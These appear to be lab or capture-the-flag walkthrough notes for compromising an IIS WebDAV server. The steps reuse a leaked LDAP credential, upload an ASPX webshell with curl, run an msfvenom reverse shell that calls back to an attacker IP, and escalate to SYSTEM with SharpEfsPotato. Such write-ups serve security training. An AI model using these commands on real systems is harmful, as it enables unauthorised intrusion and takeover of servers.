
![image](https://github.com/user-attachments/assets/407a3e7a-1299-4fee-ac5c-4a8c86ddd8a4)
![image](https://github.com/user-attachments/assets/37d26822-0461-4447-bb7e-ca8fc86e5742)
![image](https://github.com/user-attachments/assets/1e839a06-d36f-4769-9b1b-dfc5c95442e0)
![image](https://github.com/user-attachments/assets/1c1ba04f-8104-42f2-a252-2a439d978b34)
![image](https://github.com/user-attachments/assets/e055bed3-ee16-445d-b319-c81650cb8d4b)
![image](https://github.com/user-attachments/assets/43254461-3cf6-42c2-b566-f17bad444af9)
![image](https://github.com/user-attachments/assets/3c763035-0c5a-4af3-92de-c9863b8d89db)
![image](https://github.com/user-attachments/assets/7cc83511-35e9-4770-b641-4881fc99f09b)
![image](https://github.com/user-attachments/assets/7db98041-56eb-4f4c-b877-0a3e9113f81c)
![image](https://github.com/user-attachments/assets/93f8f3cf-d368-479a-95ec-d68106d46874)
![image](https://github.com/user-attachments/assets/c7444fa8-409d-42c6-93c9-832f2bcdac98)
![image](https://github.com/user-attachments/assets/66657954-5d78-4e41-8901-29b4d46edf63)

![image](https://github.com/user-attachments/assets/c70d93fd-1175-4eae-ac30-bec85cd0fb39)

![image](https://github.com/user-attachments/assets/4c96461e-8400-4050-b0a4-1b6de06e3e8e)
![image](https://github.com/user-attachments/assets/3ce002f9-2a37-4012-8f96-a1819f8c76ed)
![image](https://github.com/user-attachments/assets/109a29e8-d71b-4cc2-876e-84373262520d)

![image](https://github.com/user-attachments/assets/0f25c6b0-9921-4b52-a3b9-882c8c694b4d)

![image](https://github.com/user-attachments/assets/8479056d-234e-497c-8e4a-c282336aaef9)
![image](https://github.com/user-attachments/assets/62b56a2c-8fff-454f-b221-3f9070a740cd)

![image](https://github.com/user-attachments/assets/c38c6fb6-590d-411b-ba71-1c8b5521406f)


1. Microsoft IIS 10.0 server on port 80 with WebDAV enabled

2. ldap leak senstive info --> username: fmcsorley   password:CrabSharkJellyfish192

3. ```
   WebDAV = Web Distributed Authoring and Versioning
   It’s an extension of HTTP that lets users upload, delete, move, and edit files on a web server.
   Think of it like turning a web server into a remote file system.

   If WebDAV is enabled and allows PUT, MOVE, DELETE, etc., attacker might be able to:
    * Upload malicious files, e.g., ASPX webshells
    * Gain remote command execution if those files are interpreted by the server (like ASPX on IIS)
    * Bypass traditional upload restrictions (e.g., through WebDAV but not through the frontend app)

   | Tool    | Purpose                              | When to Use                                |
   | --------| ------------------------------------ | ------------------------------------------ |
   | davtest | Test upload & execution capabilities | For automated checks for WebDAV weaknesses |
   | cadaver | Manual WebDAV interaction            | When you want control over upload/browse   |

   |Extension| Platform           | Purpose                            | Use If...                                   |
   |---------| ------------------ | ---------------------------------- | ------------------------------------------- |
   | .aspx   | IIS (ASP.NET)      | Remote code execution              | IIS 7+ / 10 — default choice                |
   | .asp    | IIS (Classic ASP)  | Remote code execution              | If `.aspx` fails and classic ASP is enabled |
   | .php    | Apache/nginx/Linux | Remote code execution              | Only if IIS is set up to run PHP            |
   | .html   | Any web server     | Static content (no execution)      | Use for hosting basic phishing or redirect  |
   | .txt    | Any                | Probing uploads (e.g., test write) | Test whether file upload works              |
   ```
4. ```
   cp /usr/share/webshells/aspx/cmdasp.aspx .
   curl -u "hutch\\fmcsorley:CrabSharkJellyfish192" -T cmdasp.aspx http://192.168.207.122/cmdasp.aspx
   ```
5. browser to visit http://192.168.207.122/cmdasp.aspx?cmd=whoami --> get command box

6. uploaded files are under C:\inetpub\wwwroot\

7. generate reverse shell and upload to machine
   ````
   msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.212 LPORT=5985 -f exe -o shell.exe
   cadaver http://192.168.207.122/
   Username: fmcsorley
   Password:CrabSharkJellyfish192
   put shell.exe
   ````
8. execute from browser command box C:\inetpub\wwwroot\shell.exe --> get reverse shell back to Kali --> get local.txt flag under C:\Users\fmcsorley\Desktop

9. whoami /priv --> SeImpersonatePrivilege Enabled

10. upload SharpEfsPotao.exe and the generated privilege escalation shell to global writable directory C:\Users\Public

11. PE to SYSTEM
    ```
    .\SharpEfsPotato.exe -p pe.exe
    ```
